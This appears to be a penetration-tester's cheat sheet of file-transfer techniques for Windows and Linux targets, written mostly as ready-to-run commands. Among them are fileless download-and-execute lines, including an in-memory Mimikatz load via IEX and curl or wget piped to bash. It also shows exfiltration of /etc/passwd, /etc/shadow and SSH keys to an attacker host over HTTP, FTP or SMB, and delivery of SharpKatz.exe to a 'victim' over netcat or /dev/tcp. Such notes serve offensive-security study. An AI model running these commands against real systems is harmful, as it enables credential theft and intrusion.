---
# File Transfers
---
## Windows File Transfers

### PowerShell Base64 Encode & Decode
1. **Check SSH Key MD5 Hash**
```bash
md5sum id_rsa
```
2. **Encode SSH Key to Base64**
```bash
cat id_rsa | base64 -w 0;echo

justimaginethisissomerandomhashbecauseyoudontcareandidontcare=
```
3. **Decoding SSH Key on Windows machine**
```powershell
PS C:\carnifex17> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("justimaginethisissomerandomhashbecauseyoudontcareandidontcare="))
```
4. **Confirming the MD5 Hashes Match**
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
- **Note**: It's not always possible to use this method because cmd.exe has a maximum string length of 8191 characters. And also web shell may error because of this large strings. 
#### Opposite Operation
I explained above how to do encoding in **Linux** and decoding in **Powershell**, now I'll explain opposite: Encode in **Powershell** and decode in **Linux**
1. **Encode File Using Powershell**
```powershell
PS C:\carnifex17> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) # Encode
PS C:\carnifex17> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash # Get hash
```
2. **Decode Base64 String in Linux**
```bash
echo justimaginethisissomerandomhashbecauseyoudontcareandidontcare= | base64 -d > hosts
```
3. **Check Hash**
```bash
md5sum hosts
```

### Powershell Web Downloads
 In any version of **PowerShell**, the **System.Net.WebClient** class can be used to download a file over `HTTP, HTTPS or FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource.
 1. **File Download**
```powershell
#Syntax: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

#Syntax: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\carnifex17> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```
 2. **PowerShell DownloadString - Fileless Method**. Fileless attacks work by using some operationg system functions to download the payload and execute it directly. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias **IEX**
```powershell
PS C:\carnifex17> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 ```
 3. **PowerShell Invoke-WebRequest**
```powershell
PS C:\carnifex17> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
#### Common Errors
- **Internet Explorer Error**
```powershell
PS C:\carnifex17> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\carnifex17> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
- **SSL/TLS Untrusted certificate error**
```powershell
PS C:\carnifex17> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### PowerShell Web Uploads
PowerShell doesn't have a built-in upload fucntions, so we need to use **Invoke-WebRequest**.  or **Invoke-RestMethod.** Also we can use uploadserver module for Python, to install it we should use:
```bash
pip3 install uploadserver
```

- **Turn On Web Server with Upload**
```bash
python3 -m uploadserver
```

1. **PowerShell Script to Upload a File to Python Upload Server**
```powershell
PS C:\carnifex17> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\carnifex17> Invoke-FileUpload -Uri http://13.13.13.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

2. **PowerShell Base64 Web Upload**. Convert file to base64 and send it using Invoke-WebRequest with POST method. 
```powershell
PS C:\carnifex17> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\carnifex17> Invoke-WebRequest -Uri http://13.13.13.13:8000/ -Method POST -Body $b64
```
```bash
nc -lvnp 8000
```
```bash
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Downloads
1. **Create the SMB Server**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
2. **Copy a File from the SMB Server**
```powershell
C:\carnifex17> copy \\192.168.220.133\share\nc.exe
```
- But in some scenarios there would be an error, which forbids us unauthentificated guest access, so we could creat a smb server with **authentification**
1. **Create the SMB Server with a Username and Password**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
2. **Mount the SMB Server with Username and Password**
```powershell
C:\carnifex17> net use n: \\192.168.220.133\share /user:test test
```

### SMB Uploads
****
SMB Uploads will be more tricky because companies usually block uploads to SMB, cause it could cause a huge problem. BUUUT we could use HTTP or HTTPS protocol in return. It's because when you use SMB, it will first attempt to connect using SMB protocol, and if there's no SMB share available, it'll try to connect using HTTP. But for this we need WebDav protocol, it enables a webserver to behave like a fileserver, which we need. First you need to install it
```bash
sudo pip install wsgidav cheroot
```
1. **Using the WebDav Python module**
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
2. **Connecting to the Webdav Share**. DavWWWRoot isn't a folder, it's a special keyword that tells WebDAV that we are connection to the root of WebDav server. You could use any existing directory when you are connecting, as example `sharefolder`
```powershell
C:\carnifex17> dir \\13.13.13.13\DavWWWRoot
```
3. **Uploading Files using SMB**
```powershell
C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\DavWWWRoot\
C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\sharefolder\
```

### FTP Downloads
- **Installing FTP Server python3 module**
```bash
sudo pip3 install pyftpdlib
```
1. **Setting up a Python3 FTP Server**
```bash
sudo python3 -m pyftpdlib --port 21
```
2. **Transferring Files from an FTP Server Using Powershell**
```powershell
PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('ftp://13.13.13.13/file.txt', 'C:\Users\Public\ftp-file.txt')
```
3. **Create a Command File for the FTP Client and Download the Target File**
```bash
C:\carnifex17> echo open 13.13.13.13 > ftpcommand.txt
C:\carnifex17> echo USER anonymous >> ftpcommand.txt
C:\carnifex17> echo binary >> ftpcommand.txt
C:\carnifex17> echo GET file.txt >> ftpcommand.txt
C:\carnifex17> echo bye >> ftpcommand.txt
C:\carnifex17> ftp -v -n -s:ftpcommand.txt
ftp> open 13.13.13.13
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\carnifex17>more file.txt
This is a test file
```

### FTP Uploads
For this we would also use `peftpdlib` but we need to specify the option --write to allow clients to upload files to our attack host.
1. **Starting FTP Server**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
2. **Powershell Upload File**
```powershell
PS C:\carnifex17> (New-Object Net.WebClient).UploadFile('ftp://13.13.13.13/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
3. **Create a Command File for the FTP Client to Upload a File**
```powershell
C:\carnifex17> echo open 192.168.49.128 > ftpcommand.txt
C:\carnifex17> echo USER anonymous >> ftpcommand.txt
C:\carnifex17> echo binary >> ftpcommand.txt
C:\carnifex17> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\carnifex17> echo bye >> ftpcommand.txt
C:\carnifex17> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
## Linux File Transfers
### Base64 Encode & Decode
1. **Check MD5 Hash**
```bash
md5sum id_rsa
```
2. **Encode SSH Key to Base64**
```bash
cat id_rsa |base64 -w 0;echo
```
3. **Decode the File**
```bash
echo -n 'justimaginethisissomerandomhashbecauseyoudontcareandidontcare=` | base64 -d > id_rsa
```

### Web Downloads with Wget and cURL
1. **Download a File Using wget**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
2. **Download a File Using cURL**
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Web Upload
Mechanism is similar to Windows web upload using `uploadserver` module:
```bash
sudo python3 -m pip install --user uploadserver
```
#### Secure HTTPS Web Server
1. **Start Web Server**
```bash
sudo python3 -m pip install --user uploadserver
```
2. **Create a Self-Signed Certificate**
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
3. **Start Web Server**
```bash
mkdir https && cd https
```
```bash
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
- **Upload Multiple Files**
```bash
curl -X POST https://13.13.13.13/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
#### Alternative File Transfer Method
- **Creating a Web Server with Python3**
```bash
python3 -m http.server
```
- **Creating a Web Server with Python2.7**
```bash
python2.7 -m SimpleHTTPServer
```
- **Creating a Web Server with PHP**
```bash
php -S 0.0.0.0:8000
```
- **Creating a Web Server with Ruby**
```bash
ruby -run -ehttpd . -p8000
```

### Fileless Attacks Using Linux
1. **Fileless Download with cURL**
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
2. **Fileless Download with wget**
```bash
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
### Download with Bash(/dev/tcp)
1. **Connect to the Target Webserver**
```bash
exec 3<>/dev/tcp/13.13.13.13/80
```
2. **HTTP GET Request**
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
3. **Print the Response**
```bash
cat <&3
```
### SCP Download
`SSH` is a protocol that allows secure access to remote computers. And we could use `SCP`  utility which uses SSH protocol for transferring files
1. **Enabling the SSH Server**
```bash
sudo systemctl enable ssh
```
2. **Starting the SSH Server**
```bash
sudo systemctl start ssh
```
3. **Checking for SSH Listening Port**
```bash
netstat -lnpt
```
4. **Linux - Downloading Files Using SCP**
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```
### SCP Upload
- **File Upload with SCP**
```bash
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```
## Code File Transfers
### Python
1. **Python 2 - Download**
```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
2. **Python3 - Download**
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Upload Operations
1. **Starting the Python uploadserver Module**
```bash
python3 -m uploadserver
```
1. **Uploading a File Using a Python One-liner**
```bash
python3 -c 'import requests;requests.post("http://13.13.13.13:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
1. **Oneliner in few lines for better understanding**
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://13.13.13.13:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```


### PHP
1. **PHP Download with File_get_contents()**
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
2. **PHP Download with Fopen()**
```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
3. **PHP Download a File and Pipe it to Bash**
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
### Ruby
- **Ruby - Download a File**
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
### Perl
- **Perl - Download a File**
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript
Based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/536400#536400) post, you could make `wget.js` file:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
And then we can use following command from Windows CMD or PowerShell to execute our code:
```powershell
C:\carnifex17> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
### VBScript
**VBScript** or ("Microsoft Visual Basic Scription Edition") is Microsoft scripting language that is modeled on Visual Basic. You could make wget.vbs file to download a file:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
- **Download a File using VBScript and cscript.exe**
```powershell
C:\carnifex17> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
## Miscellaneous File Transfer Methods
### File Transfer with Netcat and Ncat
3. **Netcat - Attack Host - Sending File to Compromised machine**. The option `-q 0` gonna close connection after transferring. 
```bash
# Using original netcat
victim$ nc -l -p 8000 > SharpKatz.exe
```
```bash
attacker$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
4. **Ncat - Attack Host - Sending File to Compromised machine**
```bash
# Using Ncat
victim$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
```bash
attacker$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
5. **Sending File as Input to Netcat**
```bash
attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
```bash
victim$ nc 192.168.49.128 443 > SharpKatz.exe
```
6. **Sending File as Input to Ncat**
```bash
attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
```bash
victim$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
8. **Sending File from Attacker machine to Compromised using /dev/tcp**
```bash
# Netcat option
attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
``` 
```bash
# Ncat option
attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
```bash
# Connecting to netcat using /dev/tcp
victim$ 
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer
I know I used to show about PowerShell file transfers in Windows File Transfer section, but there are possibilities when no HTTP, HTTPS or SMB are available. So here we'll use `PowerShell Remoting` aka WinRM. Usually work on TCP/5985 port for HTTP and TCP/5986 port for HTTPS. 
1. **Check TCP 5985 Port on DATABASE01**
```powershell
PS C:\carnifex17> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
2. **Create a PowerShell Remoting Session to DATABASE01**
```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
3. **Copy samplefile.txt from our Localhost to the DATABASE01 Session**
```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
4. **Copy DATABASE.txt from DATABASE01 Session to our Localhost**
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

